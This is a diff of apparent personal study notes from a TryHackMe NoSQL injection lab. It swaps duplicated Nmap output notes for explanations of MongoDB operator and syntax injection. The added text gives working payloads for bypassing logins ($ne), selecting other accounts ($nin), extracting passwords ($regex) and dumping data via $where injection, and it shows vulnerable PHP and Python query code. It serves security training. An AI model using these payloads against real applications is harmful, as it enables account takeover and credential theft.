@@ -17,178 +17,192 @@ Just as relational databases use some variant of SQL, non-relational databases s
 __________________________________________________________________________________________
 
 
-TASK 
+TASK 3 NoSQL Injection
 
+There are two main types of NoSQL Injection:
 
+    Syntax Injection    -   This is similar to SQL injection, where we have the ability to break out of the query and inject our own payload. 
+                            The key difference to SQL injection is the syntax used to perform the injection attack.
+    Operator Injection  -   Even if we can't break out of the query, we could potentially inject a NoSQL query operator that manipulates the query's behaviour, allowing us to stage attacks such as authentication bypasses.
 
+NoSQL filters use structured arrays, making injection seem difficult. 
+Unlike SQL injection, NoSQL requires injecting arrays. 
 
-
-__________________________________________________________________________________________
-
-
-TASK 
-
-
-
-
-
-__________________________________________________________________________________________
-
-
-TASK 
-
-
-
-
-__________________________________________________________________________________________
-
-
-TASK 
-
-
-
-
-
-__________________________________________________________________________________________
-
-
-TASK 
-
-
-
-
-
-__________________________________________________________________________________________
-
-
-TASK 
-
-
-
-
-__________________________________________________________________________________________
-
-
-TASK 5 Saving the output
-
-Save Nmap scan results to a file using formats like Normal, Grepable, or XML. 
-
-Normal
-
-    Save scan results in normal format using -oN FILENAME. Example:
-           
+    Simple login page:
         /*************************************************************************************
-        * pentester@TryHackMe$ cat MACHINE_IP_scan.nmap 
-        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN MACHINE_IP_scan 10.48.152.80
-        * Nmap scan report for 10.48.152.80
-        * Host is up (0.00086s latency).
-        * Not shown: 994 closed ports
-        * PORT    STATE SERVICE VERSION
-        * 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
-        * 25/tcp  open  smtp    Postfix smtpd
-        * 80/tcp  open  http    nginx 1.6.2
-        * 110/tcp open  pop3    Dovecot pop3d
-        * 111/tcp open  rpcbind 2-4 (RPC #100000)
-        * 143/tcp open  imap    Dovecot imapd
-        * MAC Address: 02:A0:E7:B5:B6:C5 (Unknown)
-        * Device type: general purpose
-        * Running: Linux 3.X
-        * OS CPE: cpe:/o:linux:linux_kernel:3.13
-        * OS details: Linux 3.13
-        * Network Distance: 1 hop
-        * Service Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+        * <?php
+        * $con = new MongoDB\Driver\Manager("mongodb://localhost:27017");
         *
-        * OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
-        *************************************************************************************/
-
-Grepable
-
-    The grepable format (-oG FILENAME) condenses results for easy filtering with tools like grep, but is less readable than normal output.
-
-        /*************************************************************************************
-        * pentester@TryHackMe$ cat MACHINE_IP_scan.gnmap 
-        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG MACHINE_IP_scan 10.48.152.80
-        * Host: 10.48.152.80	Status: Up
-        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
-        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
-        *************************************************************************************/
-
-    Using grep on normal output lacks the host's IP, e.g., "80/tcp open http nginx 1.6.2," making it less useful for multiple scans. 
-    Grepable output includes the IP, providing complete information per line.
-            
-        /*************************************************************************************
-        * pentester@TryHackMe$ grep http MACHINE_IP_scan.gnmap 
-        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
-        *************************************************************************************/
-
-XML
-    The third format is XML, saved with -oX FILENAME. 
-    Use -oA FILENAME to save in all three formats: normal, grepable, and XML.
-
-__________________________________________________________________________________________
-
-
-TASK 5 Saving the output
-
-Save Nmap scan results to a file using formats like Normal, Grepable, or XML. 
-
-Normal
-
-    Save scan results in normal format using -oN FILENAME. Example:
-           
-        /*************************************************************************************
-        * pentester@TryHackMe$ cat MACHINE_IP_scan.nmap 
-        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN MACHINE_IP_scan 10.48.152.80
-        * Nmap scan report for 10.48.152.80
-        * Host is up (0.00086s latency).
-        * Not shown: 994 closed ports
-        * PORT    STATE SERVICE VERSION
-        * 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
-        * 25/tcp  open  smtp    Postfix smtpd
-        * 80/tcp  open  http    nginx 1.6.2
-        * 110/tcp open  pop3    Dovecot pop3d
-        * 111/tcp open  rpcbind 2-4 (RPC #100000)
-        * 143/tcp open  imap    Dovecot imapd
-        * MAC Address: 02:A0:E7:B5:B6:C5 (Unknown)
-        * Device type: general purpose
-        * Running: Linux 3.X
-        * OS CPE: cpe:/o:linux:linux_kernel:3.13
-        * OS details: Linux 3.13
-        * Network Distance: 1 hop
-        * Service Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
         *
-        * OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
+        * if(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){
+        *         $user = $_POST['user'];
+        *         $pass = $_POST['pass'];
+        *
+        *         $q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);
+        *         $record = $con->executeQuery('myapp.login', $q );
+        *         $record = iterator_to_array($record);
+        *
+        *         if(sizeof($record)>0){
+        *                 $usr = $record[0];
+        *
+        *                 session_start();
+        *                 $_SESSION['loggedin'] = true;
+        *                 $_SESSION['uid'] = $usr->username;
+        *
+        *                 header('Location: /sekr3tPl4ce.php');
+        *                 die();
+        *         }
+        * }
+        * header('Location: /?err=1');
+        *
+        * ?>
         *************************************************************************************/
 
-Grepable
+    The web app queries MongoDB's "myapp.login" collection with ['username'=>$user, 'password'=>$pass], where $user and $pass come from POST parameters. 
+        ['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]  
+    It tricks the DB into returning any document where username and password don't match the given values, bypassing authentication. 
 
-    The grepable format (-oG FILENAME) condenses results for easy filtering with tools like grep, but is less readable than normal output.
-
-        /*************************************************************************************
-        * pentester@TryHackMe$ cat MACHINE_IP_scan.gnmap 
-        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG MACHINE_IP_scan 10.48.152.80
-        * Host: 10.48.152.80	Status: Up
-        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
-        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
-        *************************************************************************************/
-
-    Using grep on normal output lacks the host's IP, e.g., "80/tcp open http nginx 1.6.2," making it less useful for multiple scans. 
-    Grepable output includes the IP, providing complete information per line.
-            
-        /*************************************************************************************
-        * pentester@TryHackMe$ grep http MACHINE_IP_scan.gnmap 
-        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
-        *************************************************************************************/
-
-XML
-    The third format is XML, saved with -oX FILENAME. 
-    Use -oA FILENAME to save in all three formats: normal, grepable, and XML.
+    To pass arrays via POST, use:
+        user[$ne]=xxxx&pass[$ne]=yyyy
 
 __________________________________________________________________________________________
 
 
+TASK 5 Operator Injection: Logging in as Other Users
+
+We bypassed the login screen but could only log in as the first user. 
+Using the `$nin` operator, we can control which user to access. 
+
+    The `$nin` operator filters documents where a field is not in a list.
+        ['username'=>['$nin'=>['admin']], 'password'=>['$ne'=>'aweasdf']]
+    This excludes the `admin` user. To exclude more users, expand the list:
+        ['username'=>['$nin'=>['admin', 'jude']], 'password'=>['$ne'=>'aweasdf']]
+
+    To pass arrays via POST, use:
+        user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=yyyy
+    Repeat as needed to access other accounts.
+
+__________________________________________________________________________________________
+
+
+TASK 6 Operator Injection: Extracting Users' Passwords
+
+We can extract passwords by abusing the `$regex` operator, similar to hangman.
+
+    Guess password length:
+        Use payload: `['username'=>'admin', 'password'=>['$regex'=>'^.{7}$']]`
+        The Location header in server response will show error if not match.
+        If login fails, length isn't 7. Repeat until correct length is found.
+
+    Guess password content:
+        Use payload: `['username'=>'admin', 'password'=>['$regex'=>'^c....$']]`
+        If login fails, first letter isn't "c". Iterate over characters until success.
+
+    Repeat for all letters:
+        Continue until full password is recovered. Repeat for other users if needed.
+    Repeat as needed to access other accounts.
+
+    To pass arrays via POST, use:
+        user=john&pass[$regex]=^.{8}$
+
+__________________________________________________________________________________________
+
+
+TASK 7 Syntax Injection: Identification and Data Extraction
+
+Finding Syntax Injection
+
+    A Python application is running to allow you to receive the email address of any username that is provided. 
+
+        /*************************************************************************************
+        * ssh syntax@10.81.129.104
+        * syntax@10.81.129.104's password: 
+        * Please provide the username to receive their email:admin
+        * admin@nosql.int
+        * Connection to 10.81.129.104 closed.
+        *************************************************************************************/
+
+    We can start to test for Syntax Injection by simply injecting a ' character, which will result in the error seen in the response below:
+
+        /*************************************************************************************
+        * ssh syntax@10.81.129.104
+        * syntax@10.81.129.104's password: 
+        * Please provide the username to receive their email:admin'
+        * Traceback (most recent call last):
+        * File "/home/syntax/script.py", line 17, in <module>
+        *     for x in mycol.find({"$where": "this.username == '" + username + "'"}):
+        * File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1248, in next
+        *     if len(self.__data) or self._refresh():
+        * File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1165, in _refresh
+        *     self.__send_message(q)
+        * File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1053, in __send_message
+        *     operation, self._unpack_response, address=self.__address
+        * File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1272, in _run_operation
+        *     retryable=isinstance(operation, message._Query),
+        * File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1371, in _retryable_read
+        *     return func(session, server, sock_info, read_pref)
+        * File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1264, in _cmd
+        *     sock_info, operation, read_preference, self._event_listeners, unpack_res
+        * File "/usr/local/lib/python3.6/dist-packages/pymongo/server.py", line 134, in run_operation
+        *     _check_command_response(first, sock_info.max_wire_version)
+        * File "/usr/local/lib/python3.6/dist-packages/pymongo/helpers.py", line 180, in _check_command_response
+        *     raise OperationFailure(errmsg, code, response, max_wire_version)
+        * pymongo.errors.OperationFailure: Failed to call method, full error: {'ok': 0.0, 'errmsg': 'Failed to call method', 'code': 1, 'codeName': 'InternalError'}
+        * Connection to 10.81.129.104 closed.
+        *************************************************************************************/
+
+    The following line in the error message shows us that there is Syntax Injection:
+        /*************************************************************************************
+        * for x in mycol.find({"$where": "this.username == '" + username + "'"}):
+        *************************************************************************************/
+
+    The username variable is concatenated into the query string, enabling injection. 
+    Verbose error messages confirm this, but even without them, testing with false and true conditions can reveal injection, as shown below:
+
+        /*************************************************************************************
+        * ssh syntax@10.81.129.104
+        * syntax@10.81.129.104's password: 
+        * Please provide the username to receive their email:admin' && 0 && 'x
+        * Connection to 10.81.129.104 closed.
+        *
+        * ssh syntax@10.81.129.104
+        * syntax@10.81.129.104's password: 
+        * Please provide the username to receive their email:admin' && 1 && 'x
+        * admin@nosql.int
+        * Connection to 10.81.129.104 closed.
+        *************************************************************************************/
+
+    In JavaScript, `&&` is the logical AND operator.
+    It evaluates left to right:
+        If the left side is false, the whole expression is false.
+        If the left side is true, the result is the right side.
+    Without `'x'`: the injection still works — `&& 0` forces false, `&& 1` forces true.
+    With `'x'`: you’re just appending a harmless string literal to keep the syntax neat and avoid edge cases.
+
+Exploiting Syntax Injection
+
+    Confirmed Syntax Injection allows dumping all emails. 
+    Inject '||1||' to ensure the condition always evaluates true, disclosing sensitive data.
+
+        /*************************************************************************************
+        * ssh syntax@10.81.129.104
+        * syntax@10.81.129.104's password: 
+        * Please provide the username to receive their email:admin'||1||'
+        * admin@nosql.int
+        * pcollins@nosql.int
+        * jsmith@nosql.int
+        * [...]
+        * Connection to 10.81.129.104 closed.
+        *************************************************************************************/
+
+The Exception to the Rule
+
+    Syntax Injection occurs when developers use custom JavaScript queries instead of built-in filters like ['username': username], which are not vulnerable. 
+    This is rare, as built-in functions are safer and sufficient for most cases. 
+    While some complex queries may require JavaScript, avoiding it is recommended to prevent injection risks. 
+    The example above is specific to MongoDB; other NoSQL databases may have similar vulnerabilities with different syntax.
+
+__________________________________________________________________________________________
 
 
 Appendix:
